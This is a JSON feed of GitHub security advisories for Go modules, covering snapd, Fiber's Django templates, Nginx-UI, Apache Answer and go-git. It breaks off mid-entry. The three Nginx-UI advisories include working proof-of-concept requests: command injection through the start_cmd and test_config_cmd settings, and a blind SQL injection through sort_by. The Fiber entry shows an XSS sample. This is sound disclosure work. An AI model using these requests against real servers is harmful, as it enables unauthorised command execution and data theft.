{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Go modules",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/go.json",
    "description": "Security Advisory for Go modules on GitHub",
    "items": [
        {
            "content_html": "<p>Race condition in snap-confine's must_mkdir_and_open_with_perms()</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-3328\">https://nvd.nist.gov/vuln/detail/CVE-2022-3328</a></li>\n<li><a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3328\">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3328</a></li>\n<li><a href=\"https://ubuntu.com/security/notices/USN-5753-1\">https://ubuntu.com/security/notices/USN-5753-1</a></li>\n<li><a href=\"https://github.com/snapcore/snapd/pull/12380\">https://github.com/snapcore/snapd/pull/12380</a></li>\n<li><a href=\"https://github.com/snapcore/snapd/commit/21ebc51f00b8a1417888faa2e83a372fd29d0f5e\">https://github.com/snapcore/snapd/commit/21ebc51f00b8a1417888faa2e83a372fd29d0f5e</a></li>\n<li><a href=\"https://github.com/snapcore/snapd/commit/6226cdc57052f4b7057d92f2e549aa169e35cd2d\">https://github.com/snapcore/snapd/commit/6226cdc57052f4b7057d92f2e549aa169e35cd2d</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cjqf-877p-7m3f\">https://github.com/advisories/GHSA-cjqf-877p-7m3f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cjqf-877p-7m3f",
            "title": "[github.com/snapcore/snapd] snapd Race Condition vulnerability",
            "date_modified": "2024-01-12T21:19:39.000Z",
            "date_published": "2024-01-08T18:30:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cjqf-877p-7m3f"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p><strong>Vulnerability Type:</strong> Cross-Site Scripting (XSS)<br><strong>Affected Users:</strong> All users of the Django template engine for Fiber prior to the patch. This vulnerability specifically impacts web applications that render user-supplied data through this template engine, potentially leading to the execution of malicious scripts in users' browsers when visiting affected web pages.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The vulnerability has been addressed. The template engine now defaults to having autoescape set to <code>true</code>, effectively mitigating the risk of XSS attacks. Users are advised to upgrade to the latest version of the Django template engine for Fiber, where this security update is implemented. Ensure that the version of the template engine being used is the latest, post-patch version.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>For users unable to upgrade immediately to the patched version, a workaround involves manually implementing autoescaping within individual Django templates. This method includes adding specific tags in the template to control autoescape behavior:</p>\n<pre><code class=\"language-django\">{% autoescape on %}\n{{ \"&lt;script&gt;alert('xss');&lt;/script&gt;\" }}\n{% endautoescape %}\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Official documentation of the Django template engine for Fiber: <a href=\"https://docs.gofiber.io/template/django/\">https://docs.gofiber.io/template/django/</a></li>\n<li>Django built-in template tags: <a href=\"https://docs.djangoproject.com/en/5.0/ref/templates/builtins/\">https://docs.djangoproject.com/en/5.0/ref/templates/builtins/</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/gofiber/template/security/advisories/GHSA-4mq2-gc4j-cmw6\">https://github.com/gofiber/template/security/advisories/GHSA-4mq2-gc4j-cmw6</a></li>\n<li><a href=\"https://github.com/gofiber/template/commit/28cff3ac4d4c117ab25b5396954676d624b6cb46\">https://github.com/gofiber/template/commit/28cff3ac4d4c117ab25b5396954676d624b6cb46</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-22199\">https://nvd.nist.gov/vuln/detail/CVE-2024-22199</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4mq2-gc4j-cmw6\">https://github.com/advisories/GHSA-4mq2-gc4j-cmw6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4mq2-gc4j-cmw6",
            "title": "[github.com/gofiber/template/django/v3] Django Template Engine Vulnerable to XSS",
            "date_modified": "2024-01-11T19:00:53.000Z",
            "date_published": "2024-01-11T16:41:42.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4mq2-gc4j-cmw6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Nginx-UI is a web interface to manage Nginx configurations. It is vulnerable to arbitrary command execution by abusing the configuration settings.</p>\n<h3 id=\"details\">Details</h3>\n<p>The <code>Home &gt; Preference</code> page exposes a list of system settings such as <code>Run Mode</code>, <code>Jwt Secret</code>, <code>Node Secret</code> and <code>Terminal Start Command</code>. The latter is used to specify the command to be executed when a user opens a terminal from the web interface. While the UI doesn't allow users to modify the <code>Terminal Start Command</code> setting, it is possible to do so by sending a request to the <a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/system/router.go#L13\">API</a>.</p>\n<pre><code class=\"language-go\">func InitPrivateRouter(r *gin.RouterGroup) {\n    r.GET(\"settings\", GetSettings)\n    r.POST(\"settings\", SaveSettings)\n    ...\n}\n</code></pre>\n<p>The <a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/system/settings.go#L18\"><code>SaveSettings</code></a> function is used to save the settings. It is protected by the <a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/router/middleware.go#L45\"><code>authRequired</code></a> middleware, which requires a valid JWT token or a <code>X-Node-Secret</code> which must equal the <code>Node Secret</code> configuration value. However, given the lack of authorization roles, any authenticated user can modify the settings.</p>\n<p>The <code>SaveSettings</code> function is defined as follows:</p>\n<pre><code class=\"language-go\">func SaveSettings(c *gin.Context) {\n    var json struct {\n        Server settings.Server `json:\"server\"`\n        ...\n    }\n\n    ...\n\n    settings.ServerSettings = json.Server\n\n    ...\n\n    err := settings.Save()\n    ...\n}\n</code></pre>\n<p>The <code>Terminal Start Command</code> setting is stored as <a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/settings/server.go#L12\"><code>settings.ServerSettings.StartCmd</code></a>. By spawning a terminal with <a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/terminal/pty.go#L11\"><code>Pty</code></a>, the <code>StartCmd</code> setting is used:</p>\n<pre><code class=\"language-go\">func Pty(c *gin.Context) {\n    ...\n\n    p, err := pty.NewPipeLine(ws)\n\n    ...\n}\n</code></pre>\n<p>The <a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/internal/pty/pipeline.go#L29\"><code>NewPipeLine</code></a> function is defined as follows:</p>\n<pre><code class=\"language-go\">func NewPipeLine(conn *websocket.Conn) (p *Pipeline, err error) {\n    c := exec.Command(settings.ServerSettings.StartCmd)\n\n    ...\n</code></pre>\n<p>This issue was found using CodeQL for Go: <a href=\"https://codeql.github.com/codeql-query-help/go/go-command-injection/\">Command built from user-controlled sources</a>.</p>\n<h4 id=\"proof-of-concept\">Proof of Concept</h4>\n<blockquote>\n<p>Based on <a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/README.md?plain=1#L210\">this setup</a> using <code>uozi/nginx-ui:v2.0.0-beta.7</code>.</p>\n</blockquote>\n<ol>\n<li>Login as a newly created user.</li>\n<li>Send the following request to modify the settings with <code>\"start_cmd\":\"bash\"</code> :</li>\n</ol>\n<pre><code class=\"language-http\">POST /api/settings HTTP/1.1\nHost: 127.0.0.1:8080\nContent-Length: 512\nAuthorization: &lt;&lt;JWT TOKEN&gt;&gt;\nContent-Type: application/json\n\n{\"nginx\":{\"access_log_path\":\"\",\"error_log_path\":\"\",\"config_dir\":\"\",\"pid_path\":\"\",\"test_config_cmd\":\"\",\"reload_cmd\":\"\",\"restart_cmd\":\"\"},\"openai\":{\"base_url\":\"\",\"token\":\"\",\"proxy\":\"\",\"model\":\"\"},\"server\":{\"http_host\":\"0.0.0.0\",\"http_port\":\"9000\",\"run_mode\":\"debug\",\"jwt_secret\":\"...\",\"node_secret\":\"...\",\"http_challenge_port\":\"9180\",\"email\":\"...\",\"database\":\"foo\",\"start_cmd\":\"bash\",\"ca_dir\":\"\",\"demo\":false,\"page_size\":10,\"github_proxy\":\"\"}}\n</code></pre>\n<ol start=\"3\">\n<li>Open a terminal from the web interface and execute arbitrary commands as <code>root</code>:</li>\n</ol>\n<pre><code>root@1de46642d108:/app# id\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This issue may lead to authenticated Remote Code Execution, Privilege Escalation, and Information Disclosure.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-8r25-68wm-jw35\">https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-8r25-68wm-jw35</a></li>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/commit/827e76c46e63c52114a62a899f61313039c754e3\">https://github.com/0xJacky/nginx-ui/commit/827e76c46e63c52114a62a899f61313039c754e3</a></li>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/system/settings.go#L18\">https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/system/settings.go#L18</a></li>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/terminal/pty.go#L11\">https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/terminal/pty.go#L11</a></li>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/internal/pty/pipeline.go#L29\">https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/internal/pty/pipeline.go#L29</a></li>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/router/middleware.go#L45\">https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/router/middleware.go#L45</a></li>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/settings/server.go#L12\">https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/settings/server.go#L12</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-22198\">https://nvd.nist.gov/vuln/detail/CVE-2024-22198</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8r25-68wm-jw35\">https://github.com/advisories/GHSA-8r25-68wm-jw35</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8r25-68wm-jw35",
            "title": "[github.com/0xJacky/Nginx-UI] Authenticated (user role) arbitrary command execution by modifying `start_cmd` setting (GHSL-2023-268)",
            "date_modified": "2024-01-11T21:43:14.000Z",
            "date_published": "2024-01-11T16:32:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8r25-68wm-jw35"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <code>Home &gt; Preference</code> page exposes a small list of nginx settings such as <code>Nginx Access Log Path</code> and <code>Nginx Error Log Path</code>. However, the API also exposes <code>test_config_cmd</code>, <code>reload_cmd</code> and <code>restart_cmd</code>. While the UI doesn't allow users to modify any of these settings, it is possible to do so by sending a request to the <a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/system/router.go#L13\">API</a>.</p>\n<pre><code class=\"language-go\">func InitPrivateRouter(r *gin.RouterGroup) {\n    r.GET(\"settings\", GetSettings)\n    r.POST(\"settings\", SaveSettings)\n    ...\n}\n</code></pre>\n<p>The <a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/system/settings.go#L18\"><code>SaveSettings</code></a> function is used to save the settings. It is protected by the <a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/router/middleware.go#L45\"><code>authRequired</code></a> middleware, which requires a valid JWT token or a <code>X-Node-Secret</code> which must equal the <code>Node Secret</code> configuration value. However, given the lack of authorization roles, any authenticated user can modify the settings.\nThe <code>SaveSettings</code> function is defined as follows:</p>\n<pre><code class=\"language-go\">func SaveSettings(c *gin.Context) {\n    var json struct {\n        ...\n        Nginx  settings.Nginx  `json:\"nginx\"`\n        ...\n    }\n\n    ...\n\n    settings.NginxSettings = json.Nginx\n\n    ...\n\n    err := settings.Save()\n    ...\n}\n</code></pre>\n<p>The <code>test_config_cmd</code> setting is stored as <a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/settings/nginx.go#L8\"><code>settings.NginxSettings.TestConfigCmd</code></a>. When the application wants to test the nginx configuration, it uses the <a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/internal/nginx/nginx.go#L26\"><code>TestConf</code></a> function:</p>\n<pre><code class=\"language-go\">func TestConf() (out string) {\n    if settings.NginxSettings.TestConfigCmd != \"\" {\n        out = execShell(settings.NginxSettings.TestConfigCmd)\n\n        return\n    }\n\n    out = execCommand(\"nginx\", \"-t\")\n\n    return\n}\n</code></pre>\n<p>The <a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/internal/nginx/nginx.go#L8\"><code>execShell</code></a> function is defined as follows:</p>\n<pre><code class=\"language-go\">func execShell(cmd string) (out string) {\n    bytes, err := exec.Command(\"/bin/sh\", \"-c\", cmd).CombinedOutput()\n    out = string(bytes)\n    if err != nil {\n        out += \" \" + err.Error()\n    }\n    return\n}\n</code></pre>\n<p>Where the <code>cmd</code> argument is user-controlled and is passed to <code>/bin/sh -c</code>.\nThis issue was found using CodeQL for Go: <a href=\"https://codeql.github.com/codeql-query-help/go/go-command-injection/\">Command built from user-controlled sources</a>.</p>\n<h4 id=\"proof-of-concept\">Proof of Concept</h4>\n<blockquote>\n<p>Based on <a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/README.md?plain=1#L210\">this setup</a> using <code>uozi/nginx-ui:v2.0.0-beta.7</code>.</p>\n</blockquote>\n<ol>\n<li>Login as a newly created user.</li>\n<li>Send the following request to modify the settings with <code>\"test_config_cmd\":\"touch /tmp/pwned\"</code>.</li>\n</ol>\n<pre><code class=\"language-http\">POST /api/settings HTTP/1.1\nHost: 127.0.0.1:8080\nContent-Length: 528\nAuthorization: &lt;&lt;JWT TOKEN&gt;\nContent-Type: application/json\n\n{\"nginx\":{\"access_log_path\":\"\",\"error_log_path\":\"\",\"config_dir\":\"\",\"pid_path\":\"\",\"test_config_cmd\":\"touch /tmp/pwned\",\"reload_cmd\":\"\",\"restart_cmd\":\"\"},\"openai\":{\"base_url\":\"\",\"token\":\"\",\"proxy\":\"\",\"model\":\"\"},\"server\":{\"http_host\":\"0.0.0.0\",\"http_port\":\"9000\",\"run_mode\":\"debug\",\"jwt_secret\":\"foo\",\"node_secret\":\"foo\",\"http_challenge_port\":\"9180\",\"email\":\"foo\",\"database\":\"foo\",\"start_cmd\":\"\",\"ca_dir\":\"\",\"demo\":false,\"page_size\":10,\"github_proxy\":\"\"}}\n</code></pre>\n<ol start=\"3\">\n<li>Add a new site in <code>Home &gt; Manage Sites &gt; Add Site</code> with random data. The previously-modified <code>test_config_cmd</code> setting will be used <a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/sites/domain.go#L256\">when the application tries to test the nginx configuration</a>.</li>\n<li>Verify that <code>/tmp/pwned</code> exists.</li>\n</ol>\n<pre><code>$ docker exec -it $(docker ps -q) ls -al /tmp\n-rw-r--r-- 1 root root    0 Dec 14 21:10 pwned\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This issue may lead to authenticated Remote Code Execution, Privilege Escalation, and Information Disclosure.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-pxmr-q2x3-9x9m\">https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-pxmr-q2x3-9x9m</a></li>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/commit/827e76c46e63c52114a62a899f61313039c754e3\">https://github.com/0xJacky/nginx-ui/commit/827e76c46e63c52114a62a899f61313039c754e3</a></li>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/system/router.go#L13\">https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/system/router.go#L13</a></li>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/system/settings.go#L18\">https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/system/settings.go#L18</a></li>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/router/middleware.go#L45\">https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/router/middleware.go#L45</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-22197\">https://nvd.nist.gov/vuln/detail/CVE-2024-22197</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pxmr-q2x3-9x9m\">https://github.com/advisories/GHSA-pxmr-q2x3-9x9m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pxmr-q2x3-9x9m",
            "title": "[github.com/0xJacky/Nginx-UI] Authenticated (user role) remote command execution by modifying `nginx` settings (GHSL-2023-269)",
            "date_modified": "2024-01-11T19:00:48.000Z",
            "date_published": "2024-01-11T16:30:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pxmr-q2x3-9x9m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <a href=\"https://github.com/0xjacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/model/model.go#L99C4\"><code>OrderAndPaginate</code></a> function is used to order and paginate data. It is defined as follows:</p>\n<pre><code class=\"language-go\">func OrderAndPaginate(c *gin.Context) func(db *gorm.DB) *gorm.DB {\n    return func(db *gorm.DB) *gorm.DB {\n        sort := c.DefaultQuery(\"order\", \"desc\")\n\n        order := fmt.Sprintf(\"`%s` %s\", DefaultQuery(c, \"sort_by\", \"id\"), sort)\n        db = db.Order(order)\n\n        ...\n    }\n}\n</code></pre>\n<p>By using <a href=\"https://github.com/0xjacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/model/model.go#L278-L287\"><code>DefaultQuery</code></a>, the <code>\"desc\"</code> and <code>\"id\"</code> values are used as default values if the query parameters are not set. Thus, the <code>order</code> and <code>sort_by</code> query parameter are user-controlled and are being appended to the <code>order</code> variable without any sanitization.\nThe same happens with <a href=\"https://github.com/0xjacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/model/model.go#L91\"><code>SortOrder</code></a>, but it doesn't seem to be used anywhere.</p>\n<pre><code class=\"language-go\">func SortOrder(c *gin.Context) func(db *gorm.DB) *gorm.DB {\n    return func(db *gorm.DB) *gorm.DB {\n        sort := c.DefaultQuery(\"order\", \"desc\")\n        order := fmt.Sprintf(\"`%s` %s\", DefaultQuery(c, \"sort_by\", \"id\"), sort)\n        return db.Order(order)\n    }\n}\n</code></pre>\n<p>This issue was found using CodeQL for Go: <a href=\"https://codeql.github.com/codeql-query-help/go/go-sql-injection/\">Database query built from user-controlled sources</a>.</p>\n<h4 id=\"proof-of-concept\">Proof of Concept</h4>\n<blockquote>\n<p>Based on <a href=\"https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/README.md?plain=1#L210\">this setup</a> using <code>uozi/nginx-ui:v2.0.0-beta.7</code>.\nIn order to exploit this issue, we need to find a place where the <code>OrderAndPaginate</code> function is used. We can find it in the <code>GET /api/dns_credentials</code> endpoint.</p>\n</blockquote>\n<pre><code class=\"language-go\">func GetDnsCredentialList(c *gin.Context) {\n    cosy.Core[model.DnsCredential](c).SetFussy(\"provider\").PagingList()\n}\n</code></pre>\n<p>The <code>PagingList</code> function is defined as follows:</p>\n<pre><code class=\"language-go\">func (c *Ctx[T]) PagingList() {\n    data, ok := c.PagingListData()\n    if ok {\n        c.ctx.JSON(http.StatusOK, data)\n    }\n}\n</code></pre>\n<p>And the <code>PagingListData</code> function is defined as follows:</p>\n<pre><code class=\"language-go\">func (c *Ctx[T]) PagingListData() (*model.DataList, bool) {\n    result, ok := c.result()\n    if !ok {\n        return nil, false\n    }\n\n    result = result.Scopes(c.OrderAndPaginate())\n    ...\n}\n</code></pre>\n<p>Using the following request, an attacker can retrieve arbitrary values by checking the order used by the query. That is, the result of the comparison will make the response to be ordered in a specific way.</p>\n<pre><code class=\"language-http\">GET /api/dns_credentials?sort_by=(CASE+WHEN+(SELECT+1)=1+THEN+id+ELSE+updated_at+END)+ASC+--+ HTTP/1.1\nHost: 127.0.0.1:8080\nAuthorization: &lt;&lt;JWT TOKEN&gt;\n</code></pre>\n<p>You can notice the order change by changing <code>=1</code> to <code>=2</code>, and so the comparison will return <code>false</code> and the order will be <code>updated_at</code> instead of <code>id</code>.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>This issue may lead to <code>Information Disclosure</code></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-h374-mm57-879c\">https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-h374-mm57-879c</a></li>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/commit/ec93ab05a3ecbb6bcf464d9dca48d74452df8a5b\">https://github.com/0xJacky/nginx-ui/commit/ec93ab05a3ecbb6bcf464d9dca48d74452df8a5b</a></li>\n<li><a href=\"https://github.com/0xjacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/model/model.go#L278-L287\">https://github.com/0xjacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/model/model.go#L278-L287</a></li>\n<li><a href=\"https://github.com/0xjacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/model/model.go#L91\">https://github.com/0xjacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/model/model.go#L91</a></li>\n<li><a href=\"https://github.com/0xjacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/model/model.go#L99C4\">https://github.com/0xjacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/model/model.go#L99C4</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-22196\">https://nvd.nist.gov/vuln/detail/CVE-2024-22196</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h374-mm57-879c\">https://github.com/advisories/GHSA-h374-mm57-879c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h374-mm57-879c",
            "title": "[github.com/0xJacky/Nginx-UI] Authenticated (user role) SQL injection in `OrderAndPaginate` (GHSL-2023-270)",
            "date_modified": "2024-01-11T21:43:09.000Z",
            "date_published": "2024-01-11T16:27:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h374-mm57-879c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition') vulnerability in Apache Answer.</p>\n<p>This issue affects Apache Answer: through 1.2.0.</p>\n<p>Under normal circumstances, a user can only bookmark a question once, and will only increase the number of questions bookmarked once. However, repeat submissions through the script can increase the number of collection of the question many times.</p>\n<p>Users are recommended to upgrade to version [1.2.1], which fixes the issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-49619\">https://nvd.nist.gov/vuln/detail/CVE-2023-49619</a></li>\n<li><a href=\"https://lists.apache.org/thread/nscrl3c7pn68q4j73y3ottql6n5x3hd4\">https://lists.apache.org/thread/nscrl3c7pn68q4j73y3ottql6n5x3hd4</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2024/01/10/1\">http://www.openwall.com/lists/oss-security/2024/01/10/1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f899-4mr4-fqpv\">https://github.com/advisories/GHSA-f899-4mr4-fqpv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f899-4mr4-fqpv",
            "title": "[github.com/apache/incubator-answer] Apache Answer Race Condition vulnerability",
            "date_modified": "2024-01-10T15:50:45.000Z",
            "date_published": "2024-01-10T09:30:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f899-4mr4-fqpv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A path traversal vulnerability was discovered in go-git versions prior to <code>v5.11</code>. This vulnerability allows an attacker to create and amend files across the filesystem. In the worse case scenario, remote code execution could be achieved.</p>\n<p>Applications are only affected if they are using the <a href=\"https://pkg.go.dev/github.com/go-git/go-billy/v5/osfs#ChrootOS\">ChrootOS</a>, which is the default when using \"Plain\" versions of Open and Clone funcs (e.g. PlainClone). Applications using <a href=\"https://pkg.go.dev/github.com/go-git/go-billy/v5/osfs#BoundOS\">BoundOS</a> or in-memory filesystems are not affected by this issue.\nThis is a <code>go-git</code> implementation issue and does not affect the upstream <code>git</code> cli.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Users running versions of <code>go-git</code> from <code>v4</code> and above are recommended to upgrade to <code>v5.11</code> in order to mitigate this vulnerability.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>In cases where a bump to the latest version of <code>go-git</code> is not possible in a timely manner, we recommend limiting its use to only trust-worthy Git servers.</p>\n<h2 id=\"credit\">Credit</h2>\n<p>Thanks to Ionut Lalu for responsibly disclosing this vulnerability to us.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/go-git/go-git/security/advisories/GHSA-449p-3h89-pw88\">https://github.com/go-git/go-git/security/advisories/GHSA-449p-3h89-pw88</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-49569\">https://nvd.nist.gov/vuln/detail/CVE-2023-49569</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-449p-3h89-pw88\">https://github.com/advisories/GHSA-449p-3h89-pw88</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-449p-3h89-pw88",
            "title": "[github.com/go-git/go-git/v5] Maliciously crafted Git server replies can lead to path traversal and RCE on go-git clients",
            "date_modified": "2024-01-12T16:32:44.000Z",
            "date_published": "2024-01-10T15:37:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-449p-3h89-pw88"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A path traversal vulnerability was discovered in go-git versions prior to <code>v5.11</code>. This vulnerability allows an attacker to create and amend files across the filesystem. In the worse case scenario, remote code execution could be achieved.</p>\n<p>Applications are only affected if they are using the <a href=\"https://pkg.go.dev/github.com/go-git/go-billy/v5/osfs#ChrootOS\">ChrootOS</a>, which is the default when using \"Plain\" versions of Open and Clone funcs (e.g. PlainClone). Applications using <a href=\"https://pkg.go.dev/github.com/go-git/go-billy/v5/osfs#BoundOS\">BoundOS</a> or in-memory filesystems are not affected by this issue.\nThis is a <code>go-git</code> implementation issue and does not affect the upstream <code>git</code> cli.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Users running versions of <code>go-git</code> from <code>v4</code> and above are recommended to upgrade to <code>v5.11</code> in order to mitigate this vulnerability.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>In cases where a bump to the latest version of <code>go-git</code> is not possible in a timely manner, we recommend limiting its use to only trust-worthy Git servers.</p>\n<h2 id=\"credit\">Credit</h2>\n<p>Thanks to Ionut Lalu for responsibly disclosing this vulnerability to us.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/go-git/go-git/security/advisories/GHSA-449p-3h89-pw88\">https://github.com/go-git/go-git/security/advisories/GHSA-449p-3h89-pw88</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-49569\">https://nvd.nist.gov/vuln/detail/CVE-2023-49569</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-449p-3h89-pw88\">https://github.com/advisories/GHSA-449p-3h89-pw88</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-449p-3h89-pw88",
            "title": "[github.com/go-git/go-git/v4] Maliciously crafted Git server replies can lead to path traversal and RCE on go-git clients",
            "date_modified": "2024-01-12T16:32:44.000Z",
